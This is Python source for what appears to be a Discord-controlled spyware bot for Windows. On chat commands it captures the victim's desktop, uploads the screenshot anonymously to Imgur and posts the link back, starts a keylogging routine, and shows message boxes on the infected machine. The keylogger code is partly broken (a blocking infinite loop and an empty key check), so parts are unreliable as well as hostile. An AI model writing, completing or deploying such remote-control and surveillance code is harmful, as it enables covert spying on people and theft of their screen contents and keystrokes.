import discord
from discord.ext import commands
import pyautogui
import tempfile
from imgurpython import ImgurClient
from pynput.keyboard import Key, Listener
import os
import logging
import win32api
import win32console
import win32gui
import pythoncom, pyhooks
from tkinter.commondialog import Dialog
import ctypes  # An included library with Python install.   
import time
import psutil
import keyboard
import time

def on_press(event):
    if event.key == "":
        print("Key pressed:", event)

# Define intents (all default intents are enabled)
intents = discord.Intents.default()

# Create a bot instance with the defined intents
bot = commands.Bot(command_prefix='!', intents=intents)

def Mbox(title, text, style):
    return ctypes.windll.user32.MessageBoxW(0, text, title, style)

# Replace with your own Imgur client ID and secret
client_id = 'C_ID'
client_secret = 'C_Secret'

# Define the on_message event
@bot.event
async def on_message(message):
    # Ignore messages sent by the bot itself
    if message.author == bot.user:
        return

    # Define a condition: If the message content is "hello"
    if message.content.lower() == 'keylog':
        await message.channel.send('Keylogging started!')
        while True:
            keyboard.on_press = on_press
            time.sleep(1)
    elif message.content.lower() == 'help':
        await message.channel.send('commands\n\nscreenshot - capture screenshot of desktop\nkeylog - start keylogging feature\nmsgbox (Message) - display a messaegbox on PC')

    elif message.content.lower() == 'msgbox':
        await message.channel.send('command 3')

    if 'msgbox' in message.content.lower():
        # Split the message content into words
        words = message.content.split()

        # Find the index of the command
        command_index = words.index('msgbox')
        command_keyword = "msgbox"
        # Check if there's any data following the command
        if command_index + 1 < len(words):
            # Get the data following the command
            command_index = message.content.lower().index(command_keyword)

            # Calculate the index of the data following the command (including spaces)
            data_index = command_index + len(command_keyword)

            # Get the data following the command (including spaces)
            data = message.content[data_index:]

            # Strip leading and trailing spaces from the data
            data = data.strip()
            Mbox("DORB", data, 1)

            # Store the data in a variable or process it as needed
            print("Message sent:", data)

            # You can also send the data back to the channel
            await message.channel.send(f"Data following the command: {data}")
        else:
            await message.channel.send("No data found following the command.")

    # Another condition: If the message content contains "question"
    if 'screenshot' in message.content.lower():
        # Create an Imgur client instance
        client = ImgurClient(client_id, client_secret)

        # Take a screenshot
        screenshot = pyautogui.screenshot()

        # Save the screenshot to a temporary file
        with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as temp_file:
            screenshot.save(temp_file.name)

            # Upload the image to Imgur
            uploaded_image = client.upload_from_path(temp_file.name, config=None, anon=True)

            # Get the link to the uploaded image
            image_link = uploaded_image['link']

            print(f"Image uploaded to: {image_link}")
        await message.channel.send(image_link)

    # This line is required to process commands, if you're using the commands extension

# Replace 'your_token_here' with your bot's token
bot.run('API_Key')
